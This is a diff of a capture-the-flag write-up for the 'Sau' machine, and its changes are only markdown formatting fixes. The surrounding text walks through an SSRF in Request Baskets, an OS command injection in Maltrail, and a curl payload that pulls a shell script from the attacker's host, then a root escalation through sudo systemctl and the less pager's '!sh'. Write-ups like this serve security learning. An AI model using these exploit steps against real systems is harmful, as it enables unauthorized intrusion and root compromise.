@@ -81,7 +81,7 @@ Looking at the settings for my basket we find a very promising settings that cou
 
 The **`Forward URL`** configuration allows the user to forward the http request to another URL and by enabling the **`Proxy Response`** we could look at the response of the request that has been forwarded to another URL. From what we’ve seen, this feature basically works like a VPN for us. 
 
-We configure the basket to forward our request to `**[http://127.0.0.1:80](http://127.0.0.1:80)`** and show us the response.
+We configure the basket to forward our request to `[http://127.0.0.1:80](http://127.0.0.1:80)`and show us the response.
 
 ![Untitled](/assets/images/sau/5.png)
 
@@ -100,7 +100,7 @@ Looking at the web page we see that it is running a service called Maltrail. A q
 subprocess.check_output("logger -p auth.info -t \"%s[%d]\" \"%s password for %s from %s port %s\"" % (NAME.lower(), os.getpid(), "Accepted" if valid else "Failed", params.get("username"), self.client_address[0], self.client_address[1]), stderr=subprocess.STDOUT, shell=True)
 ```
 
-This line of code is the culprit for this OS Command Injection. From my understanding, the cause of this vulnerability is due to the fact that the `**shell=TRUE`** was set and our user input isn’t properly sanitized before being inserted into the command. Therefore, an attacker could just insert their own commands leading to Command injection.
+This line of code is the culprit for this OS Command Injection. From my understanding, the cause of this vulnerability is due to the fact that the `shell=TRUE`was set and our user input isn’t properly sanitized before being inserted into the command. Therefore, an attacker could just insert their own commands leading to Command injection.
 
 Now that we are aware of the vulnerability, lets exploit it to get a SHELL on the machine.
 
@@ -110,7 +110,7 @@ curl http://10.10.11.224/utslgxu --data 'username=;`curl 10.10.14.123:8000/shell
 
 # Privilege Escalation
 
-Now that we are on the box as the user puma, we can do our usual privilege escalation enumeration. Starting with `**sudo -l**`
+Now that we are on the box as the user puma, we can do our usual privilege escalation enumeration. Starting with `sudo -l`
 
 ![Untitled](/assets/images/sau/7.png)
 
@@ -121,11 +121,11 @@ We can see that we can run systemctl with sudo. A quick GTFO bin search will sho
 
 ![Untitled](/assets/images/sau/8.png)
 
-Basically when `**systemctl**` is ran with sudo the default pager `**less`** will be ran with sudo privileges as well. 
+Basically when `systemctl` is ran with sudo the default pager `less` will be ran with sudo privileges as well. 
 
 > A pager is **a tool for displaying the contents of files or other output on the terminal, in a user friendly way, across several screens if needed**.
 > 
 
-And when we get put into the pager in this case it is `**less` . W**e can spawn a shell with the `**!sh**` command when we are in the less pager, giving us a shell as the root user!
+And when we get put into the pager in this case it is `less`. We can spawn a shell with the `!sh` command when we are in the less pager, giving us a shell as the root user!
 
 ![Untitled](/assets/images/sau/9.png)
